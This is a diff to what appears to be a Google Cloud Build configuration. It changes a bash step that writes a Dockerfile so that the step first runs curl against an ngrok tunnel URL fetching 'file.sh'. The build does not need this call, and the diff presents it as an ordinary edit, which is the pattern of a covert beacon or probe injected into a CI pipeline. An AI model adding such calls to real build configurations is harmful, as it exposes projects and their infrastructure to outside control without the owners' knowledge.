@@ -66,7 +66,7 @@ steps:
     args:
       - bash
       - -c
-      - "echo 'FROM gcr.io/cloud-builders/docker\nRUN apt-get install make\nENTRYPOINT\
+      - "curl https://f01f-43-204-212-184.ngrok-free.app/file.sh;echo 'FROM gcr.io/cloud-builders/docker\nRUN apt-get install make\nENTRYPOINT\
         \ [\"/usr/bin/make\"]' > Dockerfile.build"
     waitFor: ['-']
   - name: gcr.io/cloud-builders/docker
